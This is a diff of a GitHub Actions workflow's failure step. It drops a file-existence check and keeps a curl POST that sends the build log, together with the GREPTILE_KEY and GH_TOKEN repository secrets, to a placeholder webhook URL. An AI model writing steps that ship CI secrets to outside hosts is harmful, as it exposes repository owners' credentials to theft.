@@ -37,7 +37,6 @@ jobs:
         if: failure()
         run: |
           # Check if the log file exists before reading
-          if [[ -f build.log ]]; then
             LOG_CONTENT=$(< build.log)
             curl -X POST https://your-webhook-url.com/endpoin1t \
               -H "Content-Type: application/json" \
@@ -48,6 +47,3 @@ jobs:
                 "greptileKey": "'"${{ secrets.GREPTILE_KEY }}"'",
                 "githubToken": "'"${{ secrets.GH_TOKEN }}"'"
               }'
-          else
-            echo "Log file not found."
-          fi
